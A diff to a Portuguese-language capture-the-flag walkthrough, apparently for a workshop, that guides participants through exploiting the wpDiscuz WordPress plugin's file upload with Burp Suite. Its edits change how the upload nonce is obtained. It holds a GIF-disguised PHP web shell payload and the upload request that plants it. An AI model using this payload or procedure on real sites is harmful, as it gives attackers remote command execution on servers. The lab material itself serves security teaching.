@@ -59,9 +59,10 @@ GIF89a
 
 ### Passo 2 — Abra o navegador do Burp e visite um post
 1. No **Burp Suite**: *Proxy → Intercept → Open Browser* (usa o proxy do Burp automaticamente).
-2. Acesse o **post** no alvo, ex.: `ALVO/?p=1` — role até os comentários (formulário do wpDiscuz).
-3. Pegue o **nonce**: no HTML da página procure o campo `wmu_nonce` (é um input hidden) e **copie o valor**.
-   > No Firefox: `Ctrl+U` (ver código-fonte) e `Ctrl+F` por `wmu_nonce`.
+2. Acesse o **post** no alvo, ex.: `ALVO/?p=1` — role até os comentários e confirme que aparece o
+   **botão de anexo** do wpDiscuz.
+   > Você **não precisa** copiar o nonce à mão: no Passo 3 vamos fazer um upload real e o próprio
+   > navegador já manda o nonce certo (o wpDiscuz o guarda num objeto JS, não num campo visível).
 
 ### Passo 3 — Envie o upload malicioso (Burp Repeater)
 Jeito mais fácil e à prova de erro:
@@ -76,8 +77,8 @@ Jeito mais fácil e à prova de erro:
      <?php system($_GET["c"]); ?>
      ```
    - deixe o `Content-Type` desse campo como **`image/gif`**.
-4. Confirme que estão presentes: `action=wmuUploadFiles`, `wmu_nonce` (o que você copiou),
-   `postId=1` e o arquivo em **`wmu_files[]`**. Clique **Send**.
+4. Confirme que estão presentes: `action=wmuUploadFiles`, `wmu_nonce` (já veio preenchido na
+   requisição interceptada), `postId=1` e o arquivo em **`wmu_files[]`**. Clique **Send**.
 5. A resposta é um **JSON** com a URL do arquivo, algo como:
    ```
    ALVO/wp-content/uploads/2026/09/shell-<numeros>.php
@@ -99,5 +100,6 @@ SECOMPwn25{|)0n't_u$3_outdat3|)_plug1n_1n_y0ur_0utd@t3d_wor|)pres$_duuh!}
 
 ## Deu errado? Confira rápido
 - **`msgUploadingNotAllowed`** na resposta → avise o palestrante (o upload de visitante precisa estar ligado).
-- **`-1` / nonce inválido** → recopie o `wmu_nonce` da página do post (ele muda) e reenvie.
+- **`-1` / nonce inválido** → não reaproveite uma requisição antiga; faça um **novo upload real**
+  pelo botão de anexo e mande essa requisição nova ao Repeater (ela já traz um nonce válido).
 - **404 ao ler a flag** → confira a URL exata que veio no JSON (o nome tem um número de tempo no fim).
